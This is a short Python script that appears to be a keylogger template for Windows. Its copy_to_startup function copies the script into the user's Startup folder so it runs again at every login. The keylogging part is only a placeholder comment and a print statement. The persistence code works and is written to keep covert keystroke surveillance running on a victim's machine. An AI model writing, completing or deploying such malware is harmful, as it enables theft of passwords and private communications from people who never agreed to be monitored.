import os
import shutil
import sys

# Function to copy script to Startup folder
def copy_to_startup():
    # Get the path to the Startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Copy the script to the Startup folder
    shutil.copy(sys.argv[0], startup_folder)

# Main function (your keylogging functionality)
def main():
    # Your keylogging functionality here
    print("Keylogging started...")

if __name__ == "__main__":
    main()

    # Copy script to Startup folder
    copy_to_startup()
